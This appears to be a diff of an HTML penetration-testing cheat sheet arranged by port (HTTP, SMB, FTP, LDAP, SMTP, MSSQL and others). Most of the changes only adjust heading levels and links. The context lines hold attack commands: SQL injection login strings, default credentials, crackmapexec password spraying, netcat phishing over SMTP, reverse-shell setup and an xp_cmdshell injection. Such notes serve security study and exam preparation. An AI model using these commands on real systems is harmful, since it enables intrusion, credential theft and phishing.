@@ -173,7 +173,8 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h2 id="links"><a class="header" href="#links">Links</a></h2>
+                        <h2 id="ports"><a class="header" href="#ports">Ports</a></h2>
+<h3 id="links"><a class="header" href="#links">Links</a></h3>
 <ul>
 <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html">Total OSCP Guide</a></li>
 <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web">HackTricks 80</a></li>
@@ -182,13 +183,13 @@
 <li><a href="https://steflan-security.com/ftp-enumeration-guide/">FTP Enum</a></li>
 <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns">HackTricks 53</a></li>
 <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh">HackTricks 22</a></li>
-<li>[NetCat Email][https://www.linuxjournal.com/content/sending-email-netcat]</li>
+<li><a href="https://www.linuxjournal.com/content/sending-email-netcat">NetCat Email</a></li>
 <li><a href="https://infosecwriteups.com/what-do-netcat-smtp-and-self-xss-have-in-common-stored-xss-a05648b72002">Netcat SMTP</a></li>
 <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server">MSSQL HackTricks</a></li>
-<li></li>
+<li><a href="https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/">Evil WinRM Guide</a></li>
 </ul>
-<h2 id="80443---http"><a class="header" href="#80443---http"><ins>80/443 - HTTP</ins></a></h2>
-<h3 id="first-thing"><a class="header" href="#first-thing">First Thing</a></h3>
+<h3 id="80443---http"><a class="header" href="#80443---http"><ins>80/443 - HTTP</ins></a></h3>
+<h4 id="first-thing"><a class="header" href="#first-thing">First Thing</a></h4>
 <pre><code>
 1. Directory busting: dirb http:///&lt;IP&gt;/ 
 
@@ -203,7 +204,7 @@
 6. WordPress Scan: wpscan --url http://&lt;IP&gt;/
 
 </code></pre>
-<h3 id="while-scans-run"><a class="header" href="#while-scans-run">While Scans run:</a></h3>
+<h4 id="while-scans-run"><a class="header" href="#while-scans-run">While Scans run:</a></h4>
 <pre><code>1. Try Weak Credentials, Default Login, Intercept Request in Burp, and Try Dictionary attack to crack the credentials, Try SQLi 
 
 2. Check the Source code if anything Juicy
@@ -219,7 +220,7 @@
 9. Find exploits using keywords in the following manner: keyword poc, keyword GitHub, keyword htb, keyword hack the box
 
 </code></pre>
-<h3 id="default-creds-login-page"><a class="header" href="#default-creds-login-page">Default Creds Login Page</a></h3>
+<h4 id="default-creds-login-page"><a class="header" href="#default-creds-login-page">Default Creds Login Page</a></h4>
 <div class="table-wrapper"><table><thead><tr><th>User</th><th>Pass</th></tr></thead><tbody>
 <tr><td>admin</td><td>admin</td></tr>
 <tr><td>admin</td><td>password</td></tr>
@@ -231,7 +232,7 @@
 <tr><td>anonymous</td><td>anonymous</td></tr>
 </tbody></table>
 </div>
-<h3 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h3>
+<h4 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h4>
 <div class="table-wrapper"><table><thead><tr><th>User</th><th>Pass</th></tr></thead><tbody>
 <tr><td>tom</td><td>tom</td></tr>
 <tr><td>tom</td><td>' or '1'='1</td></tr>
@@ -243,8 +244,8 @@
 <tr><td>whatever' or '1'='1</td><td>whatever' or '1'='1</td></tr>
 </tbody></table>
 </div>
-<h2 id="139445---smb"><a class="header" href="#139445---smb"><ins>139/445 - SMB</ins></a></h2>
-<h3 id="try"><a class="header" href="#try">Try</a></h3>
+<h3 id="139445---smb"><a class="header" href="#139445---smb"><ins>139/445 - SMB</ins></a></h3>
+<h4 id="try"><a class="header" href="#try">Try</a></h4>
 <pre><code>1. Find SMB Version: 
 	1. tcpdump -i tun0 port &lt;Victim Port&gt; and src &lt;Victim IP&gt; -s0 -A -n 2&gt;/dev/null 
 	2. crackmapexec smb &lt;Victim IP&gt; --shares --port &lt;Victim Port&gt; 1&gt;/dev/null 2&gt;/dev/null
@@ -271,7 +272,7 @@
 
 12. Try Crackmapexec, psexec, smbexec, wmiexec
 </code></pre>
-<h3 id="if-we-have-username-and-password"><a class="header" href="#if-we-have-username-and-password">If we have Username and Password</a></h3>
+<h4 id="if-we-have-username-and-password"><a class="header" href="#if-we-have-username-and-password">If we have Username and Password</a></h4>
 <pre><code>1. Authenticated SMB Shares: smbclient \\\new-site -U &lt;domain_name\username&gt;
 
 2. Null login: crackmapexec smb &lt;IP&gt; --shares -u ' ' -p ''
@@ -289,7 +290,7 @@
 
 9. crackmapexec smb 192.168.214.249 -u /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/seclists/Passwords/darkweb2017-top100.txt -d relia.com --continue-on-success 
 </code></pre>
-<h2 id="21---ftp"><a class="header" href="#21---ftp"><ins>21 - FTP</ins></a></h2>
+<h3 id="21---ftp"><a class="header" href="#21---ftp"><ins>21 - FTP</ins></a></h3>
 <pre><code>1. Try FTP Default creds - anonymous:anonymous / admin:admin
 
 2. Once you log in, type passive and binary for file transfer modes
@@ -316,7 +317,7 @@
 
 13. Look for hidden files, go back to a directory if you find anything, and look for creds in DB Files.
 </code></pre>
-<h2 id="53---dns"><a class="header" href="#53---dns"><ins>53 - DNS</ins></a></h2>
+<h3 id="53---dns"><a class="header" href="#53---dns"><ins>53 - DNS</ins></a></h3>
 <pre><code>1. nslookup: nslookup --- SERVER &lt;IP&gt; --- 127.0.0.1
 
 2. God command: dig @&lt;IP&gt; any &lt;domain_name&gt;
@@ -332,7 +333,7 @@
 7. Nmap Zone Transfer: nmap --script=dns-zone-transfer -p 53 &lt;domain_name&gt;
 
 </code></pre>
-<h2 id="22---ssh"><a class="header" href="#22---ssh"><ins>22 - SSH</ins></a></h2>
+<h3 id="22---ssh"><a class="header" href="#22---ssh"><ins>22 - SSH</ins></a></h3>
 <pre><code>
 1. SSH Login: ssh &lt;username&gt;@&lt;IP&gt;
 
@@ -350,7 +351,7 @@
 
 8. After initial access, find ssh keys in linux: find / -name ssh 2&gt;/dev/null
 </code></pre>
-<h2 id="3896363268---ldap"><a class="header" href="#3896363268---ldap"><ins>389/636/3268 - LDAP</ins></a></h2>
+<h3 id="3896363268---ldap"><a class="header" href="#3896363268---ldap"><ins>389/636/3268 - LDAP</ins></a></h3>
 <pre><code>1. Domain name: nmap -n -sV --script "ldap* and not brute" &lt;IP&gt;
 
 2. Banner Grabbing: nmap -p 389 --script ldap-search -Pn &lt;IP&gt;
@@ -372,7 +373,7 @@ LDAP Login: ldapdomaindump &lt;IP&gt; [-r &lt;IP&gt;] -u '&lt;domain\user&gt;' -
 
 
 </code></pre>
-<h2 id="161---snmp"><a class="header" href="#161---snmp"><ins>161 - SNMP</ins></a></h2>
+<h3 id="161---snmp"><a class="header" href="#161---snmp"><ins>161 - SNMP</ins></a></h3>
 <pre><code>
 1. Nmap: sudo nmap -sU --open -p 161 10.11.1.1-254 (find ip with SMTP open)
 
@@ -387,7 +388,7 @@ LDAP Login: ldapdomaindump &lt;IP&gt; [-r &lt;IP&gt;] -u '&lt;domain\user&gt;' -
 6. Enumerating Open TCP Ports: snmpwalk -c public -v1 &lt;IP&gt; 1.3.6.1.2.1.6.13.1.3
 
 </code></pre>
-<h2 id="25---smtp"><a class="header" href="#25---smtp"><ins>25 - SMTP</ins></a></h2>
+<h3 id="25---smtp"><a class="header" href="#25---smtp"><ins>25 - SMTP</ins></a></h3>
 <pre><code>1. To find Users: nmap --script smtp-enum-users.nse -p 25,465,587 &lt;IP&gt;
 2. If Anonymous Login is allowed we can use Netcat to send Phishing emails through SMTP.
 
@@ -426,7 +427,7 @@ Make sure nc is setup and run this:
 
 
 </code></pre>
-<h2 id="3389---rdp"><a class="header" href="#3389---rdp"><ins>3389 - RDP</ins></a></h2>
+<h3 id="3389---rdp"><a class="header" href="#3389---rdp"><ins>3389 - RDP</ins></a></h3>
 <pre><code>If you get RDP, first transfer nc.exe (windows) or netcat (Linux) to get the shell back on our attacking machine.
 
 1. Xfreerdp: xfreerdp /v:&lt;IP&gt; /u:&lt;USER&gt; /d:&lt;DOMAIN&gt; /p:&lt;PASS&gt; +clipboard /dynamic-resolution /drive:/opt,share
@@ -449,7 +450,7 @@ Make sure nc is setup and run this:
 
 
 </code></pre>
-<h2 id="135593---rpc"><a class="header" href="#135593---rpc"><ins>135/593 - RPC</ins></a></h2>
+<h3 id="135593---rpc"><a class="header" href="#135593---rpc"><ins>135/593 - RPC</ins></a></h3>
 <pre><code>
 1. Null login: rpcclient &lt;IP&gt; -U ''
 
@@ -461,7 +462,7 @@ rpcclient -U "" -N &lt;IP&gt;
 4. Dump: impacket-rpcdump -p 135 &lt;IP&gt;
 
 </code></pre>
-<h2 id="59855986---evil-winrm"><a class="header" href="#59855986---evil-winrm"><ins>5985/5986 - Evil-winrm</ins></a></h2>
+<h3 id="59855986---evil-winrm"><a class="header" href="#59855986---evil-winrm"><ins>5985/5986 - Evil-winrm</ins></a></h3>
 <pre><code>1. Check: crackmapexec --verbose winrm &lt;IP&gt; -u &lt;username&gt; -p &lt;password&gt;
 
 2. Try both ports: evil-winrm -i &lt;IP&gt; -u &lt;username&gt; -p &lt;password&gt; -p &lt;port&gt;
@@ -474,7 +475,7 @@ rpcclient -U "" -N &lt;IP&gt;
 
 
 </code></pre>
-<h2 id="3306---mysql"><a class="header" href="#3306---mysql"><ins>3306 - MYSQL</ins></a></h2>
+<h3 id="3306---mysql"><a class="header" href="#3306---mysql"><ins>3306 - MYSQL</ins></a></h3>
 <pre><code>1. MYSQL Login: mysql -h &lt;IP&gt; -u &lt;username&gt; -p &lt;pass&gt; -P &lt;port&gt;
 
 2. Nmap Vulnerability scan: nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 &lt;IP&gt;
@@ -482,7 +483,7 @@ rpcclient -U "" -N &lt;IP&gt;
 3. Login: sqsh -S &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -D &lt;database&gt;
 
 </code></pre>
-<h3 id="xp_cmdshell---rce"><a class="header" href="#xp_cmdshell---rce">xp_cmdshell -&gt; RCE</a></h3>
+<h4 id="xp_cmdshell---rce"><a class="header" href="#xp_cmdshell---rce">xp_cmdshell -&gt; RCE</a></h4>
 <pre><code>sqsh -S &lt;IP&gt; -U &lt;Username&gt; -P &lt;Password&gt; -D &lt;Database&gt;
 
 In sqsh, you need to use GO after writing the query to send it
@@ -534,7 +535,7 @@ nc -nvlp 4444
 admin'EXEC+xp_cmdshell+'c%3a\\inetpub\\wwwroot\\test.exe%3b--
 
 </code></pre>
-<h2 id="1433---mssql"><a class="header" href="#1433---mssql"><ins>1433 - MSSQL</ins></a></h2>
+<h3 id="1433---mssql"><a class="header" href="#1433---mssql"><ins>1433 - MSSQL</ins></a></h3>
 <pre><code>
 1. Login: sqsh -S &lt;IP&gt; -U &lt;username&gt; -P "&lt;pass&gt;"
 
@@ -545,7 +546,7 @@ admin'EXEC+xp_cmdshell+'c%3a\\inetpub\\wwwroot\\test.exe%3b--
 4. Login: impacket-mssqlclient :&lt;username&gt;:&lt;pass&gt;@&lt;IP&gt; -local-auth
 
 </code></pre>
-<h3 id="xp_cmdshell---rce-1"><a class="header" href="#xp_cmdshell---rce-1">xp_cmdshell -&gt; RCE</a></h3>
+<h4 id="xp_cmdshell---rce-1"><a class="header" href="#xp_cmdshell---rce-1">xp_cmdshell -&gt; RCE</a></h4>
 <pre><code>sqsh -S &lt;IP&gt; -U &lt;Username&gt; -P &lt;Password&gt; -D &lt;Database&gt;
 
 In sqsh, you need to use GO after writing the query to send it
